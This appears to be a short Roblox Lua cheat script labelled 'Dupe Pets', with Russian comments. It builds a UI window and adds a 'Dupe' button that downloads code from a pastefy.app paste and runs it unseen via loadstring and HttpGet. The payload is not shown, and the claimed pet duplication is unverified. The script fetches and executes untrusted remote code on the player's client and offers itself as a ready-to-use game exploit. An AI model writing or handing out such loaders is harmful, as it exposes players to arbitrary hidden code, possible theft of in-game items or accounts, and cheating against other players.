local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Dupe Pets", "Serpent")

local DupeButton = Window:NewTab(""):NewSection(""):NewButton("Dupe", "", function()
    loadstring(game:HttpGet("https://pastefy.app/iRFe6rwv/raw"))()
end)

-- Установите свой текст (EN) на кнопке:
DupeButton.Instance.Text = "Write your pet here" -- ← Меняйте этот текст


Window:NewTab(""):NewSection("Made by Mangekoy2 | v1.0")
